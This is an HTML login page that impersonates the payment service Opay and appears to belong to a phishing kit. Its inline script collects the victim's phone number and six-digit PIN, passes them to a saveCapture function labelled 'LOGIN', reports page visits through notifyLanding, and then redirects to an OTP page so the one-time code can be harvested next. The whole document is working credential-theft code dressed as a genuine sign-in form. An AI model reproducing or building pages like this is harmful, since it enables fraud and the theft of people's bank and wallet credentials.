<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login - Opay</title><link rel="stylesheet" href="style.css"></head>
<body><div class="card">
<div class="logo">O</div>
<div class="title">Opay</div>
<div class="subtitle">Sign in with your phone number and PIN</div>
<form id="loginForm">
<div class="form-group"><label for="phone">Phone Number</label><input type="tel" id="phone" placeholder="Enter your phone number" required></div>
<div class="form-group"><label for="pin">6-Digit PIN</label><input type="password" id="pin" placeholder="Enter your 6-digit PIN" maxlength="6" inputmode="numeric" required></div>
<button type="submit" id="continueBtn">Sign In</button>
</form>
<div class="footer">© 2026 Opay · All rights reserved</div>
</div>
<script src="helper.js"></script>
<script>
const SITE='opay', DISPLAY='Opay', CATEGORY='local_companies';
window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Login'));
document.getElementById('loginForm').addEventListener('submit', function(e){
  e.preventDefault();
  const phone = document.getElementById('phone').value.trim();
  const pin = document.getElementById('pin').value.trim();
  if (!phone || pin.length !== 6) { alert('Enter phone + 6-digit PIN'); return; }
  const btn = document.getElementById('continueBtn');
  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
  saveCapture(SITE, CATEGORY, 'LOGIN', { phone: phone, pin: pin }, 'Login');
  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
});
</script></body></html>
